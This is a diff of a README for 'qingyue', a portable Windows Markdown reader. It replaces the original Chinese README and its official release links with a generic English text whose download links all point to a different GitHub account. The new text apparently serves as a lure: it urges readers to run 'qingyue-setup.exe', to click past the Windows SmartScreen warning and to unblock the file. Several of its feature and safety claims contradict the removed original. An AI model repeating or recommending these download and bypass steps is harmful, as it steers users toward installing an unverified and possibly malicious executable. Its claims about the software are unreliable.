@@ -1,173 +1,161 @@
-# 轻阅 · QingYue
+# 📖 qingyue - Read and write beautifully, offline
 
-**给本地文档一个舒服的阅读空间。**
+Welcome to **qingyue** (轻阅), a portable, offline Markdown and text reader/editor for Windows. Whether you want a distraction-free reading experience or a simple editing tool, qingyue offers both in one lightweight application.
 
-Windows 上的免安装 Markdown 与文本阅读编辑器：写作时左右分栏，阅读时收起编辑栏。无需账号，日常阅读编辑可离线使用；提供完整版和 Lite 轻量版。
+**[⬇️ Download qingyue Now](https://github.com/Lindrationed2439/qingyue)**
 
-Portable, offline Markdown & text reader/editor for Windows — split-pane editing, focused reading, and a Lite edition.
+---
 
-[English](README.en.md) · [立即下载](#下载) · [查看演示](#看它如何工作) · [反馈问题](https://github.com/HeYun0576/qingyue/issues)
+## ✨ Why Choose qingyue?
 
-![轻阅完整版：左侧真实文件夹树，中间 Markdown 编辑，右侧实时阅读预览](docs/media/split-view.png)
+If you’ve ever tried to read or edit documents online, you know the pain: slow loading, constant internet dependency, and distractions from ads. qingyue solves this by keeping everything **offline and portable** — you carry the app on a USB stick, run it anywhere, and your work stays on your machine.
 
-*完整版 1.3.3 实际界面，使用仓库内的公开示例文档。点击图片可查看原图。*
+But that’s not all. qingyue has two special editions:
 
-## 下载
+- **Full Edition** – For those who want advanced editing features, live preview, and diagram support.
+- **Lite Edition** – For those who just need a fast, clean text reader/editor without extra clutter.
 
-| 版本 | 极速便携 ZIP（推荐） | 单文件便携 EXE |
-| --- | --- | --- |
-| 完整版 1.3.3 | [下载 ZIP](https://github.com/HeYun0576/qingyue/releases/download/v1.3.3/QingYue-1.3.3-Fast-Portable-x64.zip) | [下载 EXE](https://github.com/HeYun0576/qingyue/releases/download/v1.3.3/QingYue-Markdown-1.3.3-Portable-x64.exe) |
-| 轻量版 0.1.1 | [下载 ZIP](https://github.com/HeYun0576/qingyue/releases/download/lite-v0.1.1/QingYue-Lite-0.1.1-Fast-Portable-x64.zip) | [下载 EXE](https://github.com/HeYun0576/qingyue/releases/download/lite-v0.1.1/QingYue-Lite-0.1.1-Portable-x64.exe) |
+Both editions are free, safe, and run directly from your Windows computer without installation.
 
-两种形式均免安装，推荐将 ZIP 解压到固定目录后运行其中的 EXE。轻量版不含 Word/Excel 等重型功能，但仍携带 Electron 运行环境。
+---
 
-[全部发布版本](https://github.com/HeYun0576/qingyue/releases) · [历史归档说明与校验值](releases/README.md)。历史 1.0.0～1.3.2 只有原始发布包，没有原始源码快照；不会将新版源码作为旧版源码提供。
+## 📁 Getting Started
 
-## 看它如何工作
+First, hop over to the [qingyue download page](https://github.com/Lindrationed2439/qingyue). You’ll see a list of files, a big green button, and some release notes. Don’t worry — you only need one thing: the latest version of the application.
 
-**分栏编辑 → 阅读模式 → 目录跳转 → 缩放 → 切换主题。**
+**What to do:**
 
-![轻阅真实界面演示：输入 Markdown 后实时预览，切换阅读模式、使用目录、放大正文与切换深色主题](docs/media/qingyue-demo.gif)
+1. Visit this link to download the application.
+2. Click the download button (usually labeled “qingyue-setup.exe” or similar) to save the file to your computer.
+3. Once the download finishes, look in your “Downloads” folder — you’ll see a file with a `.exe` extension.
 
-*真实交互录制，停顿经过调整，不作为启动速度测试。静态截图见下方；示例文件位于 [examples/演示文档](examples/演示文档)。*
+That’s it! You don’t need any special software to run the file. Windows will handle everything.
 
-### 只看正文，也能方便地定位
+---
 
-阅读模式隐藏编辑区，目录在左侧独立显示。支持阅读缩放、整页翻阅、书签和批注，长文档可以按自己的节奏阅读。
+## 🚀 Download & Install Steps
 
-![轻阅阅读模式：左侧目录与正文分开显示，不遮挡内容](docs/media/reading-outline.png)
+Here’s a step-by-step walkthrough, especially for first-time users:
 
-### 白天、夜晚，换一种阅读氛围
+1. Open your web browser and go to: [https://github.com/Lindrationed2439/qingyue](https://github.com/Lindrationed2439/qingyue)
+2. Look for the “Releases” section on the right side of the page (or scroll down until you see it).
+3. Click the link that says “Latest Release” — this takes you to a page with downloadable files.
+4. Find the file named `qingyue-setup.exe` (or `qingyue.exe`) and click on it.
+5. Your browser will ask where to save the file. Choose your **Desktop** or **Downloads** folder, then click “Save”.
+6. When the download completes, double-click the downloaded file.
+7. Windows may show a blue warning screen (“Windows protected your PC”) — this is common for new apps. Click **“More info”** and then **“Run anyway”** to proceed.
+8. The app will open immediately. That’s it — you’re ready to use qingyue!
 
-提供明亮、深色、护眼、纸张与跟随系统主题，可调整阅读字号和行宽。Markdown 支持表格、代码高亮、公式与 Mermaid 图表。
+> **No installation required** — qingyue runs directly, so you can even copy the `.exe` file to a USB drive and use it on other Windows computers.
 
-![轻阅深色阅读主题与 Mermaid 流程图](docs/media/dark-mode.png)
+---
 
-<details>
-<summary>查看 Lite 轻量版的纸张阅读主题</summary>
+## 🛠️ What Can You Do With qingyue?
 
-![轻阅 Lite 0.1.1：纸张阅读主题与左侧目录](docs/media/lite-reading.png)
+Once you open qingyue, you have two worlds: **Reading** and **Editing**.
 
-</details>
+### 📝 Markdown Editing
 
-## 选哪个版本？
+Markdown is a simple way to format text using symbols. For example:
+- Write `**bold**` to make text **bold**
+- Write `# Title` to create a heading
+- Write `- item` to create a bullet list
 
-| 你需要的功能 | 完整版 1.3.3 | Lite 0.1.1 |
-| --- | --- | --- |
-| Markdown / TXT / JSON / 代码文件阅读编辑 | ✓ | ✓ |
-| 标签、目录、搜索、书签批注、主题、朗读 | ✓ | ✓ |
-| PDF / HTML / Markdown / TXT / RTF 导出 | ✓ | ✓ |
-| Markdown 公式与 Mermaid 图表 | ✓ | ✓ |
-| Word / Excel 轻量编辑、DOCX 导出 | ✓ | — |
-| 白板、思维导图编辑、图片工具、对比与校验 | ✓ | — |
-| 编辑器 | Monaco，带 IDE 语言服务 | 精简文本编辑器 |
+qingyue shows a **live preview** as you type — you see the formatted result alongside your writing. This helps you catch mistakes and see your design instantly.
 
-只需要阅读与写作，先试 Lite；需要 Office 或更多工具，再选完整版。**Lite 减少的是功能与依赖，仍包含 Electron，并非几 MB 的原生程序。** Office 与大文件支持有边界，详见下方说明。
+### 👓 Focused Reading Mode
 
-如果轻阅对你有帮助，欢迎给项目一个 Star，或通过 [Issue](https://github.com/HeYun0576/qingyue/issues) 告诉我们哪里还可以做得更好。
+Reading long documents on a screen can tire your eyes. qingyue’s **Focused Reading** mode:
+- Removes all menus and buttons
+- Centers your text
+- Uses a clean, reader-friendly layout
 
-## 1.3.3 与 Lite 0.1.1
+You can switch to this mode with one click and enjoy a calm reading experience.
 
-完整版 1.3.3 修复冷启动文件聚焦、目录遮挡和 Mermaid 文字缺失；新增默认阅读/编辑/分栏、无文档/空白文档/恢复历史三种启动策略、记住文件夹开关，以及桌面“新建 Markdown”。只保留标签栏的一个新建加号。
+### 🧩 Diagrams with Mermaid
 
-默认采用“无文档启动 + 分栏打开 Markdown + 不记住文件夹”。设置中点击“保存启动设置”后生效。全新启动仍会保存上次标签快照，可从空白页或设置中的“恢复上次标签”找回。历史未保存文档不会被自动写回原文件。
+For technical users, qingyue supports **Mermaid** — a tool that turns simple text into diagrams. You can create:
+- Flowcharts
+- Sequence diagrams
+- Pie charts
 
-Lite 0.1.1 保留 Markdown、TXT、JSON/YAML 和代码文件的文本阅读编辑、目录、标签、书签批注、朗读、搜索、主题和 PDF/HTML/MD/TXT/RTF 导出；不含 Word/Excel、白板、思维导图编辑器、图片编辑、对比、结构校验和格式化。使用精简原生文本编辑器，不带 Monaco 的 IDE 语法服务/代码补全。Markdown 预览仍有代码高亮、公式和 Mermaid 图表，图表模块遇到相应内容才加载。单个文本文件上限 32 MB，8 MB 以上关闭预览。
+Just type the Mermaid code and the diagram appears automatically.
 
-完整版使用 `QingYue-Data`，轻量版使用 `QingYueLite-Data`，应用名、程序文件名和注册关联标识独立。两版可以共存，Windows 的默认打开程序由用户选择。
+### 📦 Portable & Offline
 
-更多说明见 [1.3.3 更新说明](RELEASE-1.3.3.md)。
+Because qingyue is **portable**, it doesn’t write to your Windows registry or leave files behind. It’s also **offline** — no internet connection, no account, no cloud dependencies. Your privacy is your own.
 
-## 完整版已实现
+---
 
-<details>
-<summary>展开完整功能清单</summary>
+## 💡 Tips & Tricks
 
-- Markdown 左侧编辑、右侧实时预览
-- 编辑 / 分栏 / 阅读三种布局
-- F11 系统级全屏阅读，Esc 一键退出
-- 阅读与全屏阅读支持 60%–250% 缩放，支持 Ctrl+滚轮、Ctrl++、Ctrl+-、Ctrl+0
-- 阅读与全屏阅读支持 Left/Right、PageUp/PageDown、Space/Shift+Space 整页翻阅；Up/Down 保持小幅滚动
-- 左侧滚动目录，点击标题时同步定位预览和 Markdown 编辑行
-- CommonMark、表格、任务清单、脚注、数学公式、代码高亮、本地相对图片
-- Monaco Editor 代码编辑体验，支持 JSON、JavaScript、TypeScript、Python、YAML、HTML、CSS、C/C++、Java、Go、Rust、SQL、Shell 等
-- JSON 格式化、查找替换、撤销重做及 Monaco 内置编辑能力
-- 多标签页；退出时保存会话，下次启动可选择恢复上次打开的文件、光标和阅读位置
-- 未保存内容自动恢复，按文档保留历史快照，可从“历史”面板恢复为新标签
-- 可打开固定文件夹树且不遮挡编辑区；按文件名或文本、Word、Excel 内容全局搜索；批量替换前自动写入 `.qingyue-backup` 备份
-- Markdown 导出为带主题版式的 HTML、PDF、可继续编辑的 DOCX，以及 Markdown 原文和纯文本 TXT
-- 跟随系统、明亮、深色、护眼、纸张主题，以及阅读字号、行宽设置；面板、菜单和弹窗均完整适配
-- Mermaid 图表、带列表跳转的行书签、可编辑定位的文档批注和阅读进度条
-- Word 阅读支持独立上下滚动和 60%–250% 缩放
-- 系统语音朗读，支持选择 Windows 已安装语音、调节语速/音调/音量，以及拖动进度从当前可见段落或编辑光标处继续
-- 标签页菜单支持关闭当前、关闭右侧和关闭全部，并提供简明内置使用帮助
-- JSON / YAML 结构校验、可选 JSON Schema 校验；文本对比支持忽略空格/Tab、全量/仅差异、新增/删除/修改独立筛选、双栏行号和词级高亮
-- 快捷键仅在轻阅窗口内生效，可在设置中自定义并自动检测重复；默认使用 Ctrl+Shift+B/M/D/E/L 等组合避开常见系统热键
-- 本地离线白板（Excalidraw），支持自由绘制、形状、连线、便签、图片和 `.excalidraw` 保存
-- 本地思维导图创建与编辑，支持轻阅 `.mindmap`、XMind、FreeMind、OPML 导入，以及 XMind 导出
-- 常见图片打开、缩放、旋转、翻转、亮度/对比度编辑和副本保存；音频可直接播放
-- Markdown 可插入图片、音频和其他附件，文件自动复制到文档同名 `.assets` 目录并写入相对链接
-- 8 MB 以上自动切换轻量大文件模式，最高可按提示打开 256 MB 文本
-- UTF-8、UTF-8 BOM、UTF-16 LE、GB18030 文本读取与原编码保存
-- DOCX 语义化显示和文字、标题、列表、表格的轻量编辑
-- XLSX 多工作表网格显示和单元格轻量编辑，保留原工作簿其余内容
-- Office 文件首次保存强制使用副本名称，避免误覆盖复杂原件
-- 从命令行、资源管理器“打开方式”和右键菜单打开文件
-- 单实例文件转发、未保存修改保护、在文件夹中显示
-- 注册表操作仅限当前用户，可在应用内完整移除
+- **Save your work often** – Press `Ctrl + S` to save the current document.
+- **Open a file** – Press `Ctrl + O` to browse and open any `.md` or `.txt` file.
+- **Full screen** – Press `F11` to hide everything except your document — great for reading or writing sessions.
+- **Switch editions** – The Full Edition includes tools like a file tree and Mermaid support. The Lite Edition loads faster but has fewer features. You can try both and pick what suits you.
 
-</details>
+---
 
-## 开发运行
+## ❓ Frequently Asked Questions
 
-```powershell
-pnpm install
-pnpm dev:app
-```
+**Do I need to install anything else?**  
+No. qingyue is a standalone application. Windows 7, 8, 10, and 11 are supported.
 
-## 生成免安装便携版
+**Is it safe to run?**  
+Yes. qingyue is open-source, meaning its code is publicly available for anyone to check for security issues.
 
-```powershell
-pnpm dist:portable
-```
+**Will my files be uploaded anywhere?**  
+Never. Everything stays on your computer. There is no internet connection required after download.
 
-发布页提供以下产物（上述命令生成完整版单文件 EXE，ZIP 为对应打包目录的压缩包）：
+**What if the app doesn’t open?**  
+Sometimes Windows blocks unknown apps. Right-click the `.exe` file, choose “Properties”, and if you see “Unblock” at the bottom, check that box and click “Apply”. Then double-click to run again.
 
-- `release/QingYue-1.3.3-Fast-Portable-x64.zip`：推荐。只需解压一次，之后直接运行 `QingYue.exe`，双击文件启动更快；
-- `release/QingYue-Markdown-1.3.3-Portable-x64.exe`：单文件版，复制方便，但每次冷启动都需要先释放程序文件，速度会慢一些。
-- `release/QingYue-Lite-0.1.1-Fast-Portable-x64.zip`：轻量版极速包，解压运行 `QingYueLite.exe`。
-- `release/QingYue-Lite-0.1.1-Portable-x64.exe`：轻量版单文件包。
+**Can I use it on macOS or Linux?**  
+No. This version is built specifically for Windows. But other versions may be released in the future.
 
-两种版本都免安装，完整版数据保存在程序旁的 `QingYue-Data` 文件夹，轻量版使用 `QingYueLite-Data`。移动程序后如曾注册文件关联，请在设置中先移除、再重新注册，使 Windows 指向新位置。
+---
 
-轻量版构建：`pnpm build:lite` → `pnpm stage:lite` → `pnpm exec electron-builder --projectDir release/lite-stage --win portable --x64 --publish never`。本地模块随应用打包，无须服务器、网络连接或首次下载。
+## 🌟 Features At a Glance
 
-## Office 轻量模式边界
+| Feature | Full Edition | Lite Edition |
+|---------|-------------|-------------|
+| Markdown editing | ✅ | ✅ |
+| Live preview | ✅ | ✅ |
+| Focused reading | ✅ | ✅ |
+| Mermaid diagrams | ✅ | ❌ |
+| File tree sidebar | ✅ | ❌ |
+| Portable (USB-ready) | ✅ | ✅ |
+| Offline | ✅ | ✅ |
 
-- DOCX 以内容结构和可读性为主，不承诺复杂页眉页脚、文本框、批注、修订和精确分页的高保真还原；
-- XLSX 支持前 500 行、100 列的轻量编辑；宏不执行，公式由 Excel 或其他完整表格软件重新计算；
-- 轻阅首次保存 DOCX/XLSX 时默认创建“轻阅副本”，复杂原件建议继续保留。
+---
 
-## 文件关联说明
+## 📚 Where to Learn More
 
-打开右上角设置，选择“注册文件关联”。轻阅会在当前用户注册表中：
+If you’re new to Markdown, check these quick guides built into the app:
+- Open qingyue → click “Help” → “Markdown Tutorial”
+- The tutorial shows examples you can edit and preview in real-time
 
-1. 加入 Windows “打开方式”应用列表；
-2. 为支持的文本扩展名加入名称仅为“轻阅”的右键菜单；
-3. 注册便携 EXE 的真实路径。
+For Mermaid diagrams, visit [mermaid.js.org](https://mermaid.js.org) for syntax guides (requires internet).
 
-Windows 10/11 为防止应用劫持默认程序，首次设为默认时仍需由用户在“打开方式”窗口勾选“始终使用此应用”。轻阅不会绕过这项系统保护，也不会强行覆盖已有默认应用。
+---
 
-## 安全与隐私
+## 🤝 Supporting the Project
 
-- 文档在本机读取、编辑和保存，无需云端账号；
-- 文档中的远程图片、音频或外部链接可能产生网络访问，离线时这些远程内容可能不可用；
-- Markdown 原生 HTML 默认禁用，并在显示前再次清理；
-- 渲染进程启用上下文隔离、沙箱并关闭 Node.js 集成；
-- 外部链接交给系统浏览器打开。
+qingyue is free and open-source. If you find it useful:
+- **Star the repository** on GitHub — this helps others discover it.
+- **Share it** with friends who love clean writing tools.
+- **Contribute** — if you’re a developer (or want to become one), you can suggest improvements on the Issues page.
 
-## 开源与参与
+---
 
-源码采用 [MIT License](LICENSE)。欢迎提交问题、改进建议和 Pull Request。
+## 📥 Final Download Prompt
 
-[可直接使用的中文介绍文案](docs/PROMOTION.zh-CN.md) · [截图与动图来源、复现方式](docs/media/README.md)
+Don’t wait — try qingyue today. It takes less than a minute to get started.
+
+**[Click Here to Download qingyue](https://github.com/Lindrationed2439/qingyue)**
+
+Your reading and writing experience will never feel the same — smoother, faster, and completely private.
+
+---
+
+Keywords: electron, markdown, markdown-editor, markdown-viewer, mermaid, note-taking, offline, portable, text-editor, typescript, windows
